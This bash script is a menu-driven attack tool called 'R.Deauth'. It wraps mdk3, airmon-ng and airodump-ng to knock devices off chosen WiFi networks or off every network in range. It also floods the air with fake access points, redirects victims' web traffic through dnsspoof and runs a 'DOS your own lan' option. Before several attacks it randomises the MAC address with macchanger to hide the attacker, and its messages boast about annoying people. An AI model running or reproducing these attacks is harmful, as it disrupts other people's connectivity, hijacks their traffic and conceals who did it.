#!/bin/bash
lgreen="\e[92m"
lred="\e[91m"
nc="\e[39m"
lyellow="\e[1;33m"

interface=$(netstat -r | grep "default" | awk {'print $8'})
routerip=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
localip=$(hostname -I)
mon="mon"
BSSID=""
networkname=$(iwgetid -r)
mygithub="https://github.com/rustywolf021"
gitclonerepo="git clone https://github.com/rustywolf021/R.Deauth"
source /etc/os-release

function exitscript()
{
	echo ""
	echo -e $lgreen"cleaning up first..."
	sleep 2
	airmon-ng stop $interfacemon &> /dev/null
	sleep 1
	ifconfig $interface down &> /dev/null
	sleep 1
	macchanger -p $interface &> /dev/null
	ifconfig $interface up &> /dev/null
	clear
	echo -e $lgreen"Stoped the script :)"
	echo "Press any key..."
	exit 0
}

function exitprogram()
{
	echo ""
	echo -e $lgreen"Aight bet..."
	echo -e $lred"cya soon XD"
	exit 0
}

function fuckyourfult()
{
	echo ""
	echo -e $lgreen"If something fucked up its on you"
	echo "I warned you..."
	echo -e $lgreen"But aight bet..."
	echo -e $lred"cya soon XD"
	exit 0
}

function checkroot()
{
	if [ $(id -u) != "0" ]; then
		echo ""
		echo You need to be root to run this script...
		echo Please start R.Deauth with [sudo ./start.sh]
		exit
	else
		echo YAY your root user!
		sleep 1
		clear
	fi
}

function aretoolsinstalled()
{
	echo -e $lgreen"Checking if tools are installed..."
	echo ""
	sleep 2
	mdk3tool=`which mdk3`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"mdk3 not found need to install..."
		mdk3tool="not installed"
	fi
	airmonngtool=`which airmon-ng`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"airmon-ng not found need to install..."
		airmonngtool="not installed"
	fi
	gittool=`which git`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"git not found need to install..."
		gittool="not installed"
	fi
	arpscantool=`which arp-scan`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"arp-scan not found need to install..."
		arpscantool="not installed"
	fi
	macchangertool=`which macchanger`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"macchanger not found need to insall..."
		macchangertool="not installed"
	fi
	awktool=`which awk`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"awk not found need to install..."
		awktool="not installed"
	fi
	greptool=`which grep`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"grep not found need to install..."
		greptool="not installed"
	fi
	curltool=`which curl`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"curl not found need toinstall..."
		curltool="not installed"
	fi
	wgettool=`which wget`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"wget not found need to install..."
		wgettool="not installed"
	fi
	dnsspooftool=`which dnsspoof`
	if [[ "$?" != "0" ]]; then
		echo -e $lred"dnsspoof not found need to install..."
		dnsspooftool="not installed"
	fi
	clear
}


clear
trap exitprogram EXIT
checkroot
aretoolsinstalled
cat << "EOF"
 /$$      /$$           /$$                                            
| $$  /$ | $$          | $$                                            
| $$ /$$$| $$  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$/$$$$   /$$$$$$ 
| $$/$$ $$ $$ /$$__  $$| $$ /$$_____/ /$$__  $$| $$_  $$_  $$ /$$__  $$
| $$$$_  $$$$| $$$$$$$$| $$| $$      | $$  \ $$| $$ \ $$ \ $$| $$$$$$$$
| $$$/ \  $$$| $$_____/| $$| $$      | $$  | $$| $$ | $$ | $$| $$_____/
| $$/   \  $$|  $$$$$$$| $$|  $$$$$$$|  $$$$$$/| $$ | $$ | $$|  $$$$$$$
|__/     \__/ \_______/|__/ \_______/ \______/ |__/ |__/ |__/ \_______/
EOF
echo -e $lred
cat << "EOF"
------------------------------------------------------------------------
EOF
echo -e $lgreen"we are just setting some things rq..."
echo ""
sleep 1
echo "Done :)"
sleep 3
while :
do
trap exitprogram EXIT
interfacemon="$interface$mon"
clear
echo -e $lgreen"Welcome " $lred"$USER " $lgreen"to R.Deauth"
echo ""
echo -e $lyellow"Values: " $lgreen"Interface=" $lred"$interface " $lgreen"Routerip=" $lred"$routerip " $lgreen"Localip=" $lred"$localip"
echo -e $lgreen"         WiFi Name=" $lred"$networkname" $lgreen"OS=" $lred"$ID"
echo ""
echo -e $nc""
echo "1) Deauth a network"
echo ""
echo "2) Deauth 1 device on a network"
echo ""
echo "3) Deauth area"
echo ""
echo "4) WiFi AP spammer"
echo ""
echo "5) Web redirector (might not work / WIP)"
echo ""
echo "6) Simple lan scripts"
echo ""
echo "fix) Fix internet (if something goes wrong...)"
echo ""
echo "sf) Simple fix (recommended other then fix)"
echo ""
echo "values) Change a value"
echo ""
echo "install) installs required programs"
echo ""
echo "update) updates script from github"
echo ""
echo "e) exit"
echo ""
trap exitprogram EXIT
read -p "-->> " menu1
if [[ $menu1 == "1" ]]; then
	clear
	echo -e $lgreen"Aight lets get this"
	sleep 0.50
	clear
	echo -e $lgreen"Are you sure (y / n)"
	read -p "-->> " ajjetsr
	if [[ $ajjetsr == "y" ]]; then
		echo -e $lgreen"Lets do this..."
		echo ""
		airmon-ng start $interface &> /dev/null
		echo "Press ctrl + c to stop scan..."
		echo ""
		airodump-ng $interfacemon
		read -p "BSSID of network: " BSSID
		trap exitscript SIGINT
		echo -e $lgreen"Attacking..."
		sleep 2
		mdk3 $interfacemon a -a $BSSID
	fi
	if [[ $ajjetsr == "n" ]]; then
		echo "Check yourself first..."
		sleep 2
	fi
fi
if [[ $menu1 == "2" ]]; then
	echo "Nothing here..."
fi
if [[ $menu1 == "3" ]]; then
	clear
	echo -e $lgreen"Are you sure (y / n)"
	read -p "-->> " abcdefg
	if [[ $abcdefg == "y" ]]; then
		echo -e $lgreen"Aight"
		echo ""
		echo "Starting..."
		echo -e $lgreen"Press ctrl + c to stop"
		sleep 2
		airmon-ng start $interface &> /dev/null
		echo -e $lred"Deauthing..."
		trap exitscript SIGINT
		mdk3 $interfacemon d
	fi
	if [[ $abcdefg == "n" ]]; then
		echo -e $lred"Sort ya shit out dude..."
		sleep 2
	fi
fi
if [[ $menu1 == "4" ]]; then
	clear
	echo -e $lgreen"WiFi AP Spammer..."
	sleep 1.5
	echo "ahhhh you just want to be a dick gotcha..."
	clear
	echo "Aight how you want to do this?"
	echo ""
	echo ""
	echo "1) Random ssids"
	echo ""
	echo "2) Your own list"
	echo ""
	echo "3) My list"
	echo ""
	read -p "-->> " ssidspammermenu
	if [[ $ssidspammermenu == "1" ]]; then
		clear
		echo -e $lred"Aight lets do this!"
		sleep 2
		clear
		echo -n -e $lgreen "How many SSIDs do you want? > "
		read N
		COUNT=1
		while [ $COUNT -lt $N ] || [ $COUNT -eq $N ]; do
			echo $(pwgen 14 1) >> "ssids.txt"
			let COUNT=COUNT+1
		done
		clear
		echo -e $lgreen"Starting process..."
		echo " If you want to stop it, press CTRL+C."
		echo " "
		sleep 1
		ifconfig $interface down
		macchanger -r $interface
		airmon-ng start $interface
		ifconfig $interfacemon up
		trap exitscript EXIT
		mdk3 $AD b -f ./ssids.txt -a -s $N
	fi
	if [[ $ssidspammermenu == "2" ]]; then
		clear
		echo -e $lred"Aight lets do this!"
		read -p "Name of your wordlist: " wordlistname
		echo $lgreen"Starting..."
		ifconfig $interface down
		macchanger -r $interface
		ifconfig $interface up
		airmon-ng start $interface
		trap exitscript SIGINT
		mdk3 $interfacemon b -f ./$wordlistname -a -s 1000
	fi
	if [[ $ssidspammermenu == "3" ]]; then
		echo -e $lred"Aight lets do this!"
		sleep 2

		echo "Skeet" > ssids.txt
		echo "Rustywolf021" >> ssids.txt
		echo "Anonymous" >> ssids.txt
		echo "FBI-VAN" >> ssids.txt
		echo "Free WIFI" >> ssids.txt
		echo "SHHHHHHHH" >> ssids.txt
		echo "I guess this works???" >> ssids.txt
		echo "F*#! OFF!!!" >> ssids.txt
		wordlistname="ssids.txt"
		
		echo $lgreen"Starting..."
		ifconfig $interface down
		macchanger -r $interface
		ifconfig $interface up
		airmon-ng start $interface
		trap exitscript SIGINT
		mdk3 $interfacemon b -f ./$wordlistname -a -s 1000
	fi
fi
if [[ $menu1 == "5" ]]; then
	clear
	echo -e $lgreen"Aight lets get this..."
	sleep 2
	clear
	echo -e $lgreen"What website do you want people rederected to?"
	read -p "-->> " website
	if [[ $website == "" ]]; then
	 	echo $lred"Nothing wont work!"
	fi
	echo "$website	*.*" > webrederectsettings.txt
	echo "Starting dns spoof..."
	echo ""
	dnsspoof -f webrederectsettings.txt
fi
if [[ $menu1 == "6" ]]; then
	clear
	echo -e $lgreen"Aight time to annoy some people XD"
	sleep 2
	clear
	echo -e $lgreen"Annoying lan scripts"
	echo ""
	echo ""
	echo "1) Scan lan"
	echo ""
	echo "2) DOS your own lan"
	echo ""
	echo "*) back"
	read -p "-->> " menu2322
	if [[ $menu2322 == "1" ]]; then
		clear
		echo -e $lgreen"Scanning..."
		arp-scan -l
		echo ""
		read -p "Press any key to exit..."
	fi
	if [[ $menu2322 == "2" ]]; then
		clear
		echo -e $lgreen"So you are really mad.?.?.?"
		sleep 2
		clear
		echo -e $lgreen"are you sure? (y / n)"
		read -p "-->> " sheyrt
		if [[ $sheyrt == "y" ]]; then
			clear
			echo -e $lgreen"Starting..."
			ifconfig $interface down
			macchanger -r $interface &> /dev/null
			ifconfig $interface up
			sleep 1
			airmon-ng start $interface &> /dev/null
			echo -e $lred"Deauthing network..."
			trap exitscript SIGINT
			mdk3 $interfacemon a -n $networkname
		fi
		if [[ $sheryt == "n" ]]; then
			clear
			echo $lred"Bruh moment..."
			sleep 2
		fi
	fi
fi
if [[ $menu1 == "fix" ]]; then
	clear
	echo -e $lred"MAKE SURE YOUR VALUES ARE CORRECT BEFORE YOU RUN THIS!!!"
	echo "are you sure? (y / n)"
	read -p "-->> " fixyn
	if [[ $fixyn == "n" ]]; then
		echo -e $lgreen "Aight bet..."
		sleep 2
	fi
	if [[ $fixyn == "y" ]]; then
		trap fuckyourfult SIGINT
		echo -e $lgreen"fixing what ever the fuck you did..."
		echo "dont close this while its fixing..."
		echo ""
		interfacemon="$interface$mon"
		airmon-ng stop $interfacemon
		ifconfig $interface down
		sleep 2
		ifconfig $interface up
		echo -e $lgreen"Internet up..."
		echo "Would you like me to change resolv.conf for you??? (y / n)"
		read -p "-->> " idfkanymore
		if [[ $idfkanymore == "y" ]]; then
			echo "Fuck you cunt!"
			echo "8.8.8.8" > /etc/resolv.conf
			echo "done? I dont trust this myself but if it worked your welcome :)"
		fi
		if [[ $idfkanymore == "n" ]]; then
			echo "Aight bet, Thanks..."
		fi
	fi
	clear
	echo -e $lgreen"Would you like to test your interet connection? (y / n)"
	read -p "-->> " fucamidoij
	if [[ $fucamidoij == "y" ]]; then
		clear
		printf "%s" "waiting for connection..."
		trap exitscript EXIT
		while ! ping -c 1 -n -w 1 147.153.237.192 &> /dev/null
		do
    		printf "%c" "."
		done
		printf "\n%s\n"  "You have internet!"
	fi
	if [[ $fucamidoij == "n" ]]; then
		echo "Aight..."
		echo ""
	fi
	clear
	echo "All done XD"
	sleep 2
fi
if [[ $menu1 == "sf" ]]; then
	clear
	echo -e $lred"Fixing your wrong doing..."
	airmon-ng start $interface
	sleep 1
	airmon-ng stop $interfacemon
	sleep 1
	ifconfig $interface down
	sleep 1
	ifconfig $interface up
	sleep 1
	clear
	echo -e $lgreen"Done XD"
	sleep 2
fi
if [[ $menu1 == "values" ]]; then
	clear
	echo -e $lgreen"What value would you like to change? "
	echo ""
	echo ""
	echo "1) interface= $interface"
	echo ""
	echo "2) routerip= $routerip"
	echo ""
	echo "3) localip= $localip"
	echo ""
	echo "4) networkname= $networkname"
	echo ""
	echo "*) back"
	echo ""
	trap exitprogram EXIT
	read -p "-->> " changevalue
	if [[ $changevalue == "1" ]]; then
		read -p "Interface: " interface
		echo "Done :)"
	fi
	if [[ $changevalue == "2" ]]; then
		read -p "Routerip: " routerip
		echo "Done :)"
	fi
	if [[ $changevalue == "3" ]]; then
		read -p "Localip: " localip
		echo "Done :)"
	fi
	if [[ $changebalue == "4" ]]; then
		read -p "Network Name: " networkname
		echo "Done :)"
	fi
fi
if [[ $menu1 == "install" ]]; then
	clear
	echo -e $lgreen"Scanning your tools..."
	sleep 3
	clear
	echo -e $lyellow"Tools needed:"
	echo -e $lyellow"If there is no file path that means its not installed"
	echo -e $lyellow"or if it says not installed XD"
	echo ""
	echo -e $lgreen""
	echo "MDK3: $mdk3tool"
	echo ""
	echo "Airmon-ng: $airmonngtool"
	echo ""
	echo "Git: $gittool"
	echo ""
	echo "Arp-scan: $arpscantool"
	echo ""
	echo "Macchanger: $macchangertool"
	echo ""
	echo "Awk: $awktool"
	echo ""
	echo "Grep: $greptool"
	echo ""
	echo "Curl: $curltool"
	echo ""
	echo "Wget: $wgettool"
	echo ""
	echo "Dnsspoof: $dnsspooftool"
	echo ""
	echo ""
	echo "if all tools are installed press nothing"
	read -p "Do you want to install missing tools? (y / n) -->> " installtools
	if [[ $installtools == "y" ]]; then
		echo "Dont exit while installing..."
		sleep 3
		sudo apt-get install update
		sudo apt-get install upgrade
		sudo apt-get install mdk3
		sudo apt-get install airmon-ng
		sudo apt-get install git
		sudo apt-get install arp-scan
		sudo apt-get install macchanger
		sudo apt-get install awk
		sudo apt-get install grep
		sudo apt-get install curl
		sudo apt-get install wget
		sudo apt-get install dnsspoof
		clear
		echo -e $lgreen"Done XD"
		echo -e $lgreen"All installed and up to date..."
		sleep 3
	fi
	if [[ $installtools == "n" ]]; then
		echo -e $lgreen"Most things in here might not work..."
		echo "but your loss"
		sleep 3
	fi
	echo "Aight bet..."
	sleep 2
fi
if [[ $menu1 == "update" ]]; then
	clear
	echo -e $lgreen"Dont close script while updateing!"
	echo -e $lgreen"Updateing..."
	sleep 2
	cd
	rm -r R.Deauth
	$gitclonerepo &> /dev/null
	clear
	echo -e $lred"Closing script..."
	sleep 2
	exit 0
fi
if [[ $menu1 == "e" ]]; then
	exit 0
fi




done